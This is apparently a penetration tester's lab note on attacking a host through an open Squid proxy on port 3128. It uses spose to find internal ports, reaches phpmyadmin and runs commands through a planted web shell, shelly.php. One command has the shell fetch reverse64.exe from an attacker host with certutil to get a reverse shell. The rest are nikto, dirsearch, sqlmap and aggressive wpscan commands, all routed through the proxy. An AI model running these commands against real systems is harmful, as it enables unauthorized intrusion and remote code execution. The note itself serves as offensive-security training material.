#### Spose
```bash - kali
git clone https://github.com/aancw/spose.git && cd spose
```

```bash - kali
python3 spose.py --proxy http://$TARGET:3128 --target 127.0.0.1
```

![[Pasted image 20220610140446.png]]

#### Foxy Proxy
![[Pasted image 20220610133805.png]]

Once foxy proxy is set up, we now try visiting one of the ports found by spose:

http://127.0.0.1:3306
http://127.0.0.1:8080

Visiting 8080, we see a link for /phpmyadmin

[[phpmyadmin]]

```bash - kali
curl --proxy $TARGET:3128 "http://127.0.0.1:8080/shelly.php?cmd=whoami" 
```

[[1._Reverse Shells (WIN)#Stageless Payloads]]

[[rlwrap]]

[[Python#Server]]

[[4._File Transfers]]

```bash - kali
curl --proxy $TARGET:3128  "http://127.0.0.1:8080/shelly.php?cmd=certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F192.168.49.57%2Freverse64.exe"
```

#### Nikto
```bash - kali
nikto -h $TARGET -useproxy http://$TARGET:3128
```

#### dirsearch 
```bash - kali
dirsearch -u http://$TARGET --proxy=$TARGET:3128
```

#### sqlmap
```bash - kali
sqlmap -u http://$TARGET/sqli/Less-1/?id=1 --dbs --proxy http://$TARGET:3128
```

#### Wordpress wpscan
```bash - kali
wpscan -e ap,at,tt,cb,dbe,u,m --detection-mode aggressive --plugins-detection aggressive -t 30 --url http://$TARGET --proxy http://$TARGET
```
